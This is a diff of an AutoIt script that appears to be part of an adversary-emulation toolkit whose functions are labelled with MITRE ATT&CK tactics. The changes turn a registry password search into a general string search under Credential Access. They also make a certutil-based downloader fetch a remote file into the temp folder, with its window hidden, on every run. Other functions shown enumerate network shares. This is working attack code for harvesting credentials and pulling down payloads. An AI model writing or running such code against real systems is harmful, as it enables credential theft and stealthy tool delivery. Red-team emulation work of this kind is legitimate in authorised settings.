@@ -216,8 +216,13 @@ Func shared();DESCRIPTION:get a list of shared resources;MITRE:Discovery
    Return function_wrapper("wmic share get")
 EndFunc
 
-Func searchPasswordsOnRegistry();DESCRIPTION:search for password in registry;MITRE:Credential Access
-   Return function_wrapper("reg query HKCU /f password /t REG_SZ /s")
+Func searchStringOnRegistry($string);DESCRIPTION:search for string in registry;MITRE:Credential Access
+   $result = function_wrapper("reg query HKCU /f " & $string & " /t REG_SZ /s")
+   If StringLen($result) > 40 Then
+	  Return $result
+   Else
+	  Return 0
+   EndIf
 EndFunc
 
 Func whoami();DESCRIPTION:who am I?;MITRE:Discovery
@@ -264,9 +269,9 @@ Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp");DESCRIPTION:dow
 EndFunc
 
 Func CertUtilDownloader($url, $filePath = @TempDir & "\tools.ext") ;DESCRIPTION:use Cert Utility to download file;MITRE:LateralMovement,CommandAndControl
-   If Not FileExists($filePath) Then
+   ;If Not FileExists($filePath) Then
 	  RunWait("certutil.exe -urlcache -f " & $url & " " & $filePath,"" ,@SW_HIDE)
-   EndIf
+   ;EndIf
 EndFunc
 
 Func PopUp();DESCRIPTION:PopUp using powershell;MITRE:-
